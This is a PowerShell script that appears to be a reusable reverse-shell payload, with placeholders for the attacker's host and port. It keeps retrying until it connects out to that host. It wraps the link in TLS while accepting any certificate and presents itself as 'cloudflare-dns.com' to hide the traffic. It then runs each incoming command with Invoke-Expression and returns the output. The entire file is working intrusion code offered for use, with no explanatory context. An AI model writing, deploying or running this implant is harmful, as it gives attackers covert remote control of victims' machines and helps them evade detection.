do {
    Start-Sleep -Seconds 15
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('*LHOST*', *LPORT*)
    } catch {}
} until ($TCPClient.Connected)
$streamNet = $TCPClient.GetStream()
$streamSecure = New-Object Net.Security.SslStream($streamNet,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
$streamSecure.AuthenticateAsClient('cloudflare-dns.com',$null,$false)
$StreamWriter = New-Object IO.StreamWriter($streamSecure)
if(!$streamSecure.IsEncrypted -or !$streamSecure.IsSigned) {
    $streamSecure.Close()
    exit
}
function WriteToStream ($String) {
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $sendbytes = 'PS ' + (Get-Location).Path + '> '
    $StreamWriter.Write($String + $sendbytes)
    $StreamWriter.Flush()
}
WriteToStream ''
while(($BytesRead = $streamSecure.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    $userInput = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    if ($userInput -eq 'exit'){
        $streamSecure.Close()
        exit
        }
    if($userInput -ne $null){
        $Output = try {
                Invoke-Expression $userInput 2>&1 | Out-String
            } catch {
                $_ | Out-String
            }
        WriteToStream ($Output)
        }
}
$StreamWriter.Close()
